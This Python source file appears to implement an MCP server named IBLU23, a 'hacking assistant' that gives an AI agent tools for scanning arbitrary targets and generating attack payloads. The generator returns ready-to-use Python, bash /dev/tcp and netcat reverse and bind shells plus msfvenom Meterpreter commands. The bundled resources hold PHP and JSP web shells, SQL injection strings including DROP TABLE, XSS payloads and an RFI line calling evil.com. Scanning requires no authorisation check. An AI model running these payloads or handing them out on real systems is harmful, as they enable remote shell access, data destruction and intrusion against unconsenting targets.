#!/usr/bin/env python3
"""
☠️ MCP Server for IBLU23 Assistant ☠️
🚀 Advanced Model Context Protocol server with skull banner support 🚀
🔥 Professional security testing platform with enhanced UI 🔥
🎨 Lightning and brain emojis for power and intelligence 🎨
🧩 Organized platform layout with professional sections 🧩
"""

import asyncio
import json
import sys
from typing import Any, Dict, List, Optional
from mcp.server import Server
from mcp.server.stdio import stdio_server
from mcp.types import (
    Resource,
    Tool,
    TextContent,
    ImageContent,
    EmbeddedResource,
    LoggingLevel
)

try:
    from colorama import Fore, Style, init
    init()
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False


class MCPServer:
    """🚀 MCP Server implementation for IBLU Assistant 🚀"""
    
    def __init__(self):
        if COLORAMA_AVAILABLE:
            print(f"{Fore.CYAN}🚀 Initializing IBLU MCP Server...{Style.RESET_ALL}")
        else:
            print("🚀 Initializing IBLU MCP Server...")
        self.server = Server("iblu-mcp-server")
        self.setup_handlers()
        if COLORAMA_AVAILABLE:
            print(f"{Fore.GREEN}✅ MCP Server initialized successfully{Style.RESET_ALL}")
        else:
            print("✅ MCP Server initialized successfully")
    
    def setup_handlers(self):
        """🔧 Setup MCP server handlers"""
        
        @self.server.list_tools()
        async def handle_list_tools() -> List[Tool]:
            """List available tools"""
            return [
                Tool(
                    name="iblu_ask",
                    description="Ask IBLU assistant for cybersecurity and hacking guidance",
                    inputSchema={
                        "type": "object",
                        "properties": {
                            "query": {
                                "type": "string",
                                "description": "Your question or request for IBLU"
                            },
                            "context": {
                                "type": "string",
                                "description": "Optional context for the query"
                            }
                        },
                        "required": ["query"]
                    }
                ),
                Tool(
                    name="scan_target",
                    description="Perform basic reconnaissance on a target",
                    inputSchema={
                        "type": "object",
                        "properties": {
                            "target": {
                                "type": "string",
                                "description": "Target IP address or domain"
                            },
                            "scan_type": {
                                "type": "string",
                                "enum": ["port", "subdomain", "directory"],
                                "description": "Type of scan to perform"
                            }
                        },
                        "required": ["target", "scan_type"]
                    }
                ),
                Tool(
                    name="generate_payload",
                    description="Generate various types of payloads",
                    inputSchema={
                        "type": "object",
                        "properties": {
                            "payload_type": {
                                "type": "string",
                                "enum": ["reverse_shell", "bind_shell", "meterpreter", "custom"],
                                "description": "Type of payload to generate"
                            },
                            "target_ip": {
                                "type": "string",
                                "description": "Target IP for reverse shell payloads"
                            },
                            "port": {
                                "type": "integer",
                                "description": "Port for shell connections"
                            }
                        },
                        "required": ["payload_type"]
                    }
                )
            ]
        
        @self.server.call_tool()
        async def handle_call_tool(name: str, arguments: Dict[str, Any]) -> List[TextContent]:
            """Handle tool calls"""
            
            if name == "iblu_ask":
                query = arguments.get("query", "")
                context = arguments.get("context", "")
                
                # Import IBLU assistant here to avoid circular imports
                try:
                    from iblu_assistant import IBLUAssistant, load_config_from_file, Provider
                    
                    config = load_config_from_file("config.json")
                    assistant = IBLUAssistant(config)
                    
                    full_query = f"{context}\n\n{query}" if context else query
                    response = assistant.query(full_query, Provider.PERPLEXITY)
                    
                    return [TextContent(type="text", text=response)]
                    
                except Exception as e:
                    return [TextContent(type="text", text=f"Error: {str(e)}")]
            
            elif name == "scan_target":
                target = arguments.get("target", "")
                scan_type = arguments.get("scan_type", "port")
                
                try:
                    if scan_type == "port":
                        result = await self.port_scan(target)
                    elif scan_type == "subdomain":
                        result = await self.subdomain_scan(target)
                    elif scan_type == "directory":
                        result = await self.directory_scan(target)
                    else:
                        result = "Invalid scan type"
                    
                    return [TextContent(type="text", text=result)]
                    
                except Exception as e:
                    return [TextContent(type="text", text=f"Scan error: {str(e)}")]
            
            elif name == "generate_payload":
                payload_type = arguments.get("payload_type", "")
                target_ip = arguments.get("target_ip", "")
                port = arguments.get("port", 4444)
                
                try:
                    payload = self.generate_payload(payload_type, target_ip, port)
                    return [TextContent(type="text", text=payload)]
                    
                except Exception as e:
                    return [TextContent(type="text", text=f"Payload generation error: {str(e)}")]
            
            else:
                return [TextContent(type="text", text=f"Unknown tool: {name}")]
        
        @self.server.list_resources()
        async def handle_list_resources() -> List[Resource]:
            """List available resources"""
            return [
                Resource(
                    uri="iblu://payloads/common",
                    name="Common Payloads",
                    description="Collection of commonly used payloads",
                    mimeType="text/plain"
                ),
                Resource(
                    uri="iblu://techniques/web",
                    name="Web Hacking Techniques",
                    description="Web application security techniques",
                    mimeType="text/plain"
                )
            ]
        
        @self.server.read_resource()
        async def handle_read_resource(uri: str) -> str:
            """Read resource content"""
            if uri == "iblu://payloads/common":
                return self.get_common_payloads()
            elif uri == "iblu://techniques/web":
                return self.get_web_techniques()
            else:
                return "Resource not found"
    
    async def port_scan(self, target: str) -> str:
        """Perform basic port scan"""
        try:
            import subprocess
            result = subprocess.run(
                ["nmap", "-F", target],
                capture_output=True,
                text=True,
                timeout=30
            )
            return result.stdout if result.returncode == 0 else result.stderr
        except Exception as e:
            return f"Port scan failed: {str(e)}"
    
    async def subdomain_scan(self, target: str) -> str:
        """Perform subdomain enumeration"""
        try:
            import subprocess
            result = subprocess.run(
                ["dig", target, "ANY"],
                capture_output=True,
                text=True,
                timeout=30
            )
            return result.stdout if result.returncode == 0 else result.stderr
        except Exception as e:
            return f"Subdomain scan failed: {str(e)}"
    
    async def directory_scan(self, target: str) -> str:
        """Perform directory enumeration"""
        try:
            import subprocess
            result = subprocess.run(
                ["curl", "-s", f"http://{target}/"],
                capture_output=True,
                text=True,
                timeout=30
            )
            return result.stdout if result.returncode == 0 else result.stderr
        except Exception as e:
            return f"Directory scan failed: {str(e)}"
    
    def generate_payload(self, payload_type: str, target_ip: str, port: int) -> str:
        """Generate various payloads"""
        
        if payload_type == "reverse_shell":
            return f"""# Python Reverse Shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{target_ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

# Bash Reverse Shell
bash -i >& /dev/tcp/{target_ip}/{port} 0>&1

# Netcat Reverse Shell
nc -e /bin/sh {target_ip} {port}"""
        
        elif payload_type == "bind_shell":
            return """# Python Bind Shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("",4444));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0); os.dup2(conn.fileno(),1); os.dup2(conn.fileno(),2);import pty; pty.spawn("/bin/bash")'

# Netcat Bind Shell
nc -lvp 4444 -e /bin/sh"""
        
        elif payload_type == "meterpreter":
            return f"""# Generate Meterpreter Payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST={target_ip} LPORT={port} -f exe > meterpreter.exe

# Linux Meterpreter
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={target_ip} LPORT={port} -f elf > meterpreter.elf"""
        
        elif payload_type == "custom":
            return """# Custom Payload Template
# Modify based on your requirements
import socket
import subprocess
import os

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("TARGET_IP", PORT))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/bash"])

connect()"""
        
        else:
            return "Unknown payload type"
    
    def get_common_payloads(self) -> str:
        """Get common payloads collection"""
        return """# Common Hacking Payloads

## Web Shells
<?php system($_GET['cmd']); ?>
<?php eval($_POST['cmd']); ?>
<%@ page import="java.io.*" %><%Runtime.getRuntime().exec(request.getParameter("cmd"));%>

## SQL Injection
' OR 1=1 --
' UNION SELECT NULL,username,password FROM users --
'; DROP TABLE users; --

## XSS Payloads
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

## File Upload
<?php echo system($_GET['command']); ?>
<%eval request("cmd")%>
#!/bin/bash
/bin/bash -i >& /dev/tcp/IP/PORT 0>&1"""
    
    def get_web_techniques(self) -> str:
        """Get web hacking techniques"""
        return """# Web Application Hacking Techniques

## Information Gathering
- WHOIS lookup: whois domain.com
- DNS enumeration: dig domain.com ANY
- Subdomain brute force: gobuster dns -d domain.com -w wordlist.txt
- Technology identification: whatweb domain.com

## Vulnerability Scanning
- Nikto: nikto -h http://domain.com
- OWASP ZAP: zaproxy
- Burp Suite: Active scanning
- Nuclei: nuclei -u domain.com

## Common Attacks
1. SQL Injection
   - Error-based: ' OR 1=1 --
   - Union-based: ' UNION SELECT 1,2,3 --
   - Blind: ' AND (SELECT COUNT(*) FROM users) > 0 --

2. Cross-Site Scripting (XSS)
   - Reflected: <script>alert(1)</script>
   - Stored: <img src=x onerror=alert(1)>
   - DOM-based: document.location.href='http://evil.com'

3. File Inclusion
   - LFI: ?page=../../../../etc/passwd
   - RFI: ?page=http://evil.com/shell.txt

4. Authentication Bypass
   - SQL: admin' --
   - Default credentials: admin/admin, admin/password
   - Session fixation

## Post-Exploitation
- Privilege escalation
- Lateral movement
- Persistence mechanisms
- Data exfiltration"""
    
    async def run(self):
        """🚀 Run the MCP server"""
        if COLORAMA_AVAILABLE:
            print(f"{Fore.GREEN}🚀 Starting IBLU MCP Server on stdio...{Style.RESET_ALL}")
        else:
            print("🚀 Starting IBLU MCP Server on stdio...")
        async with stdio_server() as (read_stream, write_stream):
            await self.server.run(
                read_stream,
                write_stream,
                self.server.create_initialization_options()
            )


async def main():
    """🎯 Main entry point with skull banner support"""
    if COLORAMA_AVAILABLE:
        print(f"{Fore.CYAN}☠️═══════════════════════════════════════════════════════════════════════════════════════════════════════════════☠️{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║                                                                                              ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║  ☠️ IBLU23 MCP Server v2.0 - Professional Hacking Assistant ☠️                            ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║  📡 Advanced Model Context Protocol Server for Security Testing                             ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║  🎨 Enhanced UI with skull banner and professional integration                            ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║  ⚡ Lightning and brain emojis for power and intelligence                                   ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║                                                                                              ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}☠️═══════════════════════════════════════════════════════════════════════════════════════════════════════════════☠️{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}🔗 Initializing MCP server with enhanced security capabilities...{Style.RESET_ALL}")
    else:
        print("☠️═══════════════════════════════════════════════════════════════════════════════════════════════════════════════☠️")
        print("║                                                                                              ║")
        print("║  ☠️ IBLU23 MCP Server v2.0 - Professional Hacking Assistant ☠️                            ║")
        print("║  📡 Advanced Model Context Protocol Server for Security Testing                             ║")
        print("║  🎨 Enhanced UI with skull banner and professional integration                            ║")
        print("║  ⚡ Lightning and brain emojis for power and intelligence                                   ║")
        print("║                                                                                              ║")
        print("☠️═══════════════════════════════════════════════════════════════════════════════════════════════════════════════☠️")
        print("🔗 Initializing MCP server with enhanced security capabilities...")
    
    server = MCPServer()
    await server.run()


if __name__ == "__main__":
    asyncio.run(main())
